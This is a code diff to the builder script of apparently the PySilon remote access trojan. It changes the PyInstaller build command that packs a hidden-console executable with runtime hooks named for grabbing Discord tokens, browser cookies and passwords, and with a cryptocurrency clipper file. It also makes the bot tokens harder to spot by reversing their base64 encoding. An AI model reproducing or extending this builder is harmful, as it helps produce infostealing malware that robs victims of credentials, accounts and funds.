@@ -16,14 +16,14 @@ def compile(debug_mode):
     if 'configuration.ini' in os.listdir('.'): config.read('configuration.ini')
     else: input('Configuration file not found! Press ENTER to terminate...'); sys.exit(0)
 
-    if len(config['SETTINGS']) != 12 or len(config['FUNCTIONALITY']) != 18:
+    if len(config['SETTINGS']) != 13 or len(config['FUNCTIONALITY']) != 27:
         return 'Config corrupted'
 
-    compiling_command = 'start cmd /k "title Reorganising packages... & pip freeze > to_uninstall.txt & pip uninstall -y -r to_uninstall.txt > nul & del to_uninstall.txt > nul & pip install pillow > nul & pip install pyinstaller > nul & pip install -r custom_imports.txt > nul & title Compiling source code... & pyinstaller -F --noconsole --upx-dir "resources/" --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py ' + ('--runtime-hook=resources/protections.py ' if debug_mode else '') + '--runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py --add-data="resources/crypto_clipper.json;." --icon "' + config['SETTINGS']['icon_path'] + '" "source_prepared.py" > nul & echo - & echo.Done & echo.- & start dist & del source_prepared.spec > nul & rmdir build /S /Q & pause & exit"'
+    compiling_command = 'start cmd /k "title Reorganising packages... & pip freeze > to_uninstall.txt & pip uninstall -y -r to_uninstall.txt > nul & del to_uninstall.txt > nul & pip install pillow > nul & pip install pyinstaller > nul & pip install -r custom_imports.txt > nul & title Compiling source code... & pyinstaller -F ' + ('--noconsole ' if not debug_mode else '') + '--upx-dir "resources/" ' + ('--add-data "resources/libopus-0.x64.dll;." ' if config['FUNCTIONALITY']['mc_live'] == 'True' else '') + '--runtime-hook=resources/misc.py ' + ('--runtime-hook=resources/protections.py ' if debug_mode else '') + ('--runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' if config['FUNCTIONALITY']['grabber'] == 'True' else '') + ('--add-data="resources/crypto_clipper.json;." ' if config['FUNCTIONALITY']['crclipr'] == 'True' else '') + '--icon "' + (config['SETTINGS']['icon_path'] if config['SETTINGS']['custom_icon'] == 'True' else 'NONE' ) + '" "source_prepared.py" > nul & echo - & echo.Done & echo.- & start dist & del source_prepared.spec > nul & rmdir build /S /Q & pause & exit"'
 
-    token_1 = base64.b64encode(config['SETTINGS']['bot_token_1'].encode()).decode()
-    token_2 = base64.b64encode(config['SETTINGS']['bot_token_2'].encode()).decode() if config['SETTINGS']['bot_token_2'] != '' else None
-    token_3 = base64.b64encode(config['SETTINGS']['bot_token_3'].encode()).decode() if config['SETTINGS']['bot_token_3'] != '' else None
+    token_1 = base64.b64encode(config['SETTINGS']['bot_token_1'].encode()).decode()[::-1]
+    token_2 = base64.b64encode(config['SETTINGS']['bot_token_2'].encode()).decode()[::-1] if config['SETTINGS']['bot_token_2'] != '' else None
+    token_3 = base64.b64encode(config['SETTINGS']['bot_token_3'].encode()).decode()[::-1] if config['SETTINGS']['bot_token_3'] != '' else None
 
     with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
     with open('source_assembled.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
